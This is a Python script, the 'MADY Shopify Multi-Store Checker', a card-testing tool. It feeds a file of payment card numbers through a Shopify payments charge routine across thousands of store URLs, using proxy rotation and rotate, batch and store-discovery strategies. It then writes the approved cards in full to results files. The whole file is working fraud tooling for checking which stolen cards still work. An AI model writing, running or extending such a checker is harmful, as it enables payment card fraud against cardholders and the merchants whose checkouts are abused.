#!/usr/bin/env python3
"""
MADY Shopify Multi-Store Checker
Automatically cycles through multiple Shopify stores
Perfect for checking cards against 15000+ stores!

Usage: python3 mady_shopify_multi.py <cards_file> <stores_file> [options]
"""

import sys
import os
import argparse
import time
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add gateway path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '100$/100$/'))

from Charge10_ShopifyPayments import ShopifyPaymentsCheck

def print_banner():
    """Print banner"""
    print("="*70)
    print("MADY SHOPIFY MULTI-STORE CHECKER")
    print("Automatically cycles through multiple stores (CHARGED MODE)")
    print("="*70)
    print()

def load_cards(cards_file, limit=None):
    """Load cards from file"""
    try:
        with open(cards_file, 'r') as f:
            cards = [line.strip() for line in f if line.strip() and '|' in line]
        if limit:
            cards = cards[:limit]
        return cards
    except FileNotFoundError:
        print(f"❌ Error: Cards file not found: {cards_file}")
        return []

def load_stores(stores_file, limit=None):
    """Load stores from file"""
    try:
        with open(stores_file, 'r') as f:
            stores = [line.strip() for line in f if line.strip() and 'http' in line.lower()]
        if limit:
            stores = stores[:limit]
        return stores
    except FileNotFoundError:
        print(f"❌ Error: Stores file not found: {stores_file}")
        return []

def load_proxies(proxies_file):
    """Load proxies from file"""
    try:
        with open(proxies_file, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        print(f"⚠️ Warning: Proxies file not found: {proxies_file}")
        return []

def check_card_on_store(card, store, card_num, total_cards, store_num, total_stores, proxy=None):
    """Check a single card on a single store"""
    card_masked = f"{card.split('|')[0][:6]}****{card.split('|')[0][-4:]}"
    store_short = store.replace('https://', '').replace('http://', '')[:30]
    
    print(f"[Card {card_num}/{total_cards}] [Store {store_num}/{total_stores}] {card_masked} @ {store_short}...", end=' ', flush=True)
    
    try:
        result = ShopifyPaymentsCheck(card, store, proxy=proxy)
        result_lower = result.lower() if isinstance(result, str) else str(result).lower()
        
        # Categorize result
        if any(x in result_lower for x in ['charged', 'cvv', 'insufficient', '3ds', 'success']):
            print(f"✅ {result}")
            return {'status': 'approved', 'card': card, 'store': store, 'result': result}
        elif 'error' in result_lower:
            print(f"⚠️ {result[:50]}")
            return {'status': 'error', 'card': card, 'store': store, 'result': result}
        else:
            print(f"❌ {result[:50]}")
            return {'status': 'declined', 'card': card, 'store': store, 'result': result}
            
    except Exception as e:
        error_msg = str(e)[:50]
        print(f"⚠️ Error: {error_msg}")
        return {'status': 'error', 'card': card, 'store': store, 'result': error_msg}

def strategy_rotate(cards, stores, args, proxies=None):
    """Strategy 1: Rotate through stores for each card"""
    print("📋 Strategy: ROTATE - Each card tested on different store")
    if proxies:
        print(f"🔒 Using {len(proxies)} proxies")
    print()
    
    results = {'approved': [], 'declined': [], 'errors': []}
    start_time = time.time()
    
    total_checks = min(len(cards), len(stores))
    
    for i in range(total_checks):
        card = cards[i % len(cards)]
        store = stores[i % len(stores)]
        proxy = proxies[i % len(proxies)] if proxies else None
        
        result = check_card_on_store(card, store, i+1, total_checks, i+1, total_checks, proxy=proxy)
        results[result['status']].append(result)
        
        # Delay between checks
        if i < total_checks - 1:
            time.sleep(args.delay)
    
    return results, time.time() - start_time

def strategy_batch(cards, stores, args, proxies=None):
    """Strategy 2: Test multiple cards per store"""
    print(f"📋 Strategy: BATCH - {args.cards_per_store} cards per store")
    if proxies:
        print(f"🔒 Using {len(proxies)} proxies")
    print()
    
    results = {'approved': [], 'declined': [], 'errors': []}
    start_time = time.time()
    
    total_checks = 0
    store_num = 0
    
    for store in stores[:args.max_stores]:
        store_num += 1
        cards_for_store = cards[total_checks:total_checks + args.cards_per_store]
        
        if not cards_for_store:
            break
        
        for card_num, card in enumerate(cards_for_store, 1):
            total_checks += 1
            proxy = proxies[total_checks % len(proxies)] if proxies else None
            result = check_card_on_store(
                card, store, 
                total_checks, len(cards), 
                store_num, min(len(stores), args.max_stores),
                proxy=proxy
            )
            results[result['status']].append(result)
            
            # Delay between checks
            time.sleep(args.delay)
    
    return results, time.time() - start_time

def strategy_discover(cards, stores, args, proxies=None):
    """Strategy 3: Find valid stores first, then use them"""
    print(f"📋 Strategy: DISCOVER - Find valid stores first")
    if proxies:
        print(f"🔒 Using {len(proxies)} proxies")
    print()
    
    results = {'approved': [], 'declined': [], 'errors': []}
    valid_stores = []
    start_time = time.time()
    
    # Phase 1: Test one card on each store to find valid ones
    print("🔍 Phase 1: Discovering valid stores...")
    test_card = cards[0]
    
    for i, store in enumerate(stores[:args.max_stores], 1):
        proxy = proxies[i % len(proxies)] if proxies else None
        result = check_card_on_store(test_card, store, 1, 1, i, min(len(stores), args.max_stores), proxy=proxy)
        
        # If not error, store is valid
        if result['status'] != 'error':
            valid_stores.append(store)
            print(f"  ✓ Valid store found: {store[:50]}")
        
        time.sleep(args.delay)
        
        # Stop if we have enough valid stores
        if len(valid_stores) >= args.max_valid_stores:
            break
    
    print(f"\n✅ Found {len(valid_stores)} valid stores")
    
    if not valid_stores:
        print("❌ No valid stores found!")
        return results, time.time() - start_time
    
    # Save valid stores
    valid_stores_file = f"valid_shopify_stores_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(valid_stores_file, 'w') as f:
        for store in valid_stores:
            f.write(f"{store}\n")
    print(f"💾 Valid stores saved to: {valid_stores_file}\n")
    
    # Phase 2: Check remaining cards on valid stores
    print("🔍 Phase 2: Checking cards on valid stores...")
    remaining_cards = cards[1:]  # Skip first card (already tested)
    
    for i, card in enumerate(remaining_cards, 2):
        store = valid_stores[i % len(valid_stores)]
        proxy = proxies[i % len(proxies)] if proxies else None
        result = check_card_on_store(card, store, i, len(cards), 1, len(valid_stores), proxy=proxy)
        results[result['status']].append(result)
        time.sleep(args.delay)
    
    return results, time.time() - start_time

def print_summary(results, elapsed, cards_count, stores_count):
    """Print results summary"""
    total = len(results['approved']) + len(results['declined']) + len(results['errors'])
    avg_time = elapsed / total if total > 0 else 0
    
    print()
    print("="*70)
    print("RESULTS SUMMARY")
    print("="*70)
    print(f"Cards Loaded: {cards_count}")
    print(f"Stores Loaded: {stores_count}")
    print(f"Total Checks: {total}")
    print(f"✅ Approved: {len(results['approved'])}")
    print(f"❌ Declined: {len(results['declined'])}")
    print(f"⚠️ Errors: {len(results['errors'])}")
    print(f"⏱️ Time: {elapsed:.1f}s (avg {avg_time:.1f}s/check)")
    print("="*70)
    print()
    
    # Print approved
    if results['approved']:
        print("✅ APPROVED CARDS:")
        print("-"*70)
        for item in results['approved'][:20]:  # Show first 20
            print(f"{item['card']}")
            print(f"  Store: {item['store'][:50]}")
            print(f"  Result: {item['result']}")
            print()
        if len(results['approved']) > 20:
            print(f"... and {len(results['approved']) - 20} more approved cards")
        print()

def save_results(results, elapsed, cards_count, stores_count, strategy):
    """Save results to file"""
    output_file = f"shopify_multi_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    try:
        with open(output_file, 'w') as f:
            f.write("MADY SHOPIFY MULTI-STORE CHECKER RESULTS\n")
            f.write("="*70 + "\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Strategy: {strategy}\n")
            f.write(f"Cards: {cards_count} | Stores: {stores_count}\n")
            f.write(f"Approved: {len(results['approved'])} | Declined: {len(results['declined'])} | Errors: {len(results['errors'])}\n")
            f.write(f"Time: {elapsed:.1f}s\n")
            f.write("="*70 + "\n\n")
            
            if results['approved']:
                f.write("APPROVED CARDS:\n")
                f.write("-"*70 + "\n")
                for item in results['approved']:
                    f.write(f"{item['card']}\n")
                    f.write(f"  Store: {item['store']}\n")
                    f.write(f"  Result: {item['result']}\n\n")
            
            if results['declined']:
                f.write("\nDECLINED CARDS:\n")
                f.write("-"*70 + "\n")
                for item in results['declined']:
                    f.write(f"{item['card']}\n")
                    f.write(f"  Store: {item['store']}\n")
                    f.write(f"  Result: {item['result']}\n\n")
            
            if results['errors']:
                f.write("\nERRORS:\n")
                f.write("-"*70 + "\n")
                for item in results['errors']:
                    f.write(f"{item['card']}\n")
                    f.write(f"  Store: {item['store']}\n")
                    f.write(f"  Error: {item['result']}\n\n")
        
        print(f"💾 Results saved to: {output_file}")
        return output_file
    except Exception as e:
        print(f"⚠️ Could not save results: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(
        description='MADY Shopify Multi-Store Checker (CHARGED MODE)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Strategies:
  rotate   - Each card tested on different store (default)
  batch    - Multiple cards per store
  discover - Find valid stores first, then check cards

Examples:
  # Rotate strategy (default)
  python3 mady_shopify_multi.py cards.txt stores.txt
  
  # Batch strategy - 3 cards per store
  python3 mady_shopify_multi.py cards.txt stores.txt --strategy batch --cards-per-store 3
  
  # Discover strategy - find valid stores first
  python3 mady_shopify_multi.py cards.txt stores.txt --strategy discover --max-valid-stores 50
  
  # Limit cards and stores
  python3 mady_shopify_multi.py cards.txt stores.txt --limit-cards 100 --max-stores 500
        """
    )
    
    parser.add_argument('cards_file', help='Path to cards file')
    parser.add_argument('stores_file', help='Path to stores file')
    parser.add_argument('--strategy', choices=['rotate', 'batch', 'discover'], default='rotate',
                        help='Checking strategy (default: rotate)')
    parser.add_argument('--proxies', help='Path to proxies file (one per line: http://user:pass@host:port)')
    parser.add_argument('--cards-per-store', type=int, default=3,
                        help='Cards to test per store in batch mode (default: 3)')
    parser.add_argument('--max-stores', type=int, default=1000,
                        help='Maximum stores to use (default: 1000)')
    parser.add_argument('--max-valid-stores', type=int, default=100,
                        help='Maximum valid stores to find in discover mode (default: 100)')
    parser.add_argument('--limit-cards', type=int, help='Limit number of cards to check')
    parser.add_argument('--delay', type=float, default=0.5,
                        help='Delay between checks in seconds (default: 0.5)')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Load data
    print("📂 Loading data...")
    cards = load_cards(args.cards_file, args.limit_cards)
    stores = load_stores(args.stores_file, args.max_stores)
    proxies = load_proxies(args.proxies) if args.proxies else None
    
    if not cards:
        print("❌ No cards loaded!")
        return
    
    if not stores:
        print("❌ No stores loaded!")
        return
    
    print(f"✅ Loaded {len(cards)} cards")
    print(f"✅ Loaded {len(stores)} stores")
    if proxies:
        print(f"✅ Loaded {len(proxies)} proxies")
    print(f"⏰ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    
    # Execute strategy
    if args.strategy == 'rotate':
        results, elapsed = strategy_rotate(cards, stores, args, proxies)
    elif args.strategy == 'batch':
        results, elapsed = strategy_batch(cards, stores, args, proxies)
    elif args.strategy == 'discover':
        results, elapsed = strategy_discover(cards, stores, args, proxies)
    
    # Print and save results
    print_summary(results, elapsed, len(cards), len(stores))
    save_results(results, elapsed, len(cards), len(stores), args.strategy)

if __name__ == '__main__':
    main()
